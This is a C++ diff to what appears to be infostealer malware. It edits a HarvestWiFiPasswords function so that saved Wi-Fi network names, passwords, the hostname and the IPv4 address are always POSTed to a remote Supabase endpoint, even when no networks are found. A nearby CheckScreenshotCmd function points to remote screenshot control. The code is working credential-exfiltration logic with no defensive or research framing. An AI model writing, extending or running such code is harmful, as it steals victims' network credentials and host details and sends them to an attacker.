@@ -1404,8 +1404,6 @@ static void HarvestWiFiPasswords() {
         }
     }
 
-    if (ssids.empty()) { LogMsg("WiFi: no profiles found"); return; }
-
     std::string batch = "[";
     bool first = true;
     int count = 0;
@@ -1456,14 +1454,14 @@ static void HarvestWiFiPasswords() {
         LogMsg("WiFi: " + ssids[i]);
     }
 
-    if (count > 0) {
-        batch += "]";
-        std::string pr;
-        HttpRequest(L"POST", SUPABASE_WIFI_PATH, batch, pr);
-        LogMsg("WiFi: " + std::to_string(count) + " networks uploaded");
-    } else {
-        LogMsg("WiFi: no network details could be retrieved");
+    if (count == 0) {
+        batch += "{\"hostname\":\"" + EscapeJSON(host) + "\",\"ssid\":\"(none)\",\"password\":\"\",\"security\":\"\",\"ipv4\":\"" + EscapeJSON(ipv4) + "\"}";
+        count = 1;
     }
+    batch += "]";
+    std::string pr;
+    HttpRequest(L"POST", SUPABASE_WIFI_PATH, batch, pr);
+    LogMsg("WiFi: " + std::to_string(count) + " results uploaded");
 }
 
 static std::string CheckScreenshotCmd() {
